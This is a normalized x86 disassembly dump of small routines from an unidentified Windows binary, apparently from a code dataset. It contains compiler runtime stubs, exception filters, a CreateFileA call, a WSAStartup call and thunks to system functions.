retn
sub_200adb7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_200ae0c
push [ rw-data ]
call sub_2003ff8
pop ecx
retn
sub_200af8d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_200568b
pop ecx
sub_200afc9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200afd8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200afe7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200b017
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_200b02e
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
push 0x8
call [ SetLastError@IAT ]
sub_200b12d
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_200bad0
and [ rw-data ] 0x0
retn
sub_200bc6c
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_200be8f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200bd23
add esp 0x14
pop ebp
retn
sub_200c53a
push 0x1
call sub_200568b
pop ecx
retn
sub_200ceb8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200cd4e
add esp 0x10
pop ebp
retn
sub_200cfbd
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_200cef4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_200d008
call eax
retn
sub_200d220
push 0xa
call sub_200568b
pop ecx
retn
sub_200d323
push 0xa
call sub_200568b
pop ecx
retn
sub_200d3e1
push 0xb
call sub_200568b
pop ecx
retn
sub_200d4d0
push 0xc
push r--data
call sub_200625c
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
sub_200d4ed
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_200d582
call sub_200d520
mov [ rw-data ] eax
xor eax eax
retn
sub_200d76b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200d654
add esp 0x10
pop ebp
retn
sub_200db30
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_200d790
sub_200db46
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_200d790
sub_200de24
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_200ddd1
add esp 0x10
pop ebp
retn
sub_200ded6
push 0x4
call sub_200568b
pop ecx
retn
sub_200dedf
push 0x2
call sub_2002e95
pop ecx
retn
sub_200e0fb
push 0x4
call sub_200568b
pop ecx
retn
sub_200e443
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_200e50e
sub esp 0x194
lea eax [ esp ]
push eax
push 0x202
call WSAStartup
neg eax
sbb eax eax
add esp 0x194
retn
sub_200e52d
mov eax [ rw-data ]
mov [ rw-data ] ecx
retn
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
sub_200f31a
push 0x0
call sub_200291b
pop ecx
retn
sub_2010278
xor eax eax
retn
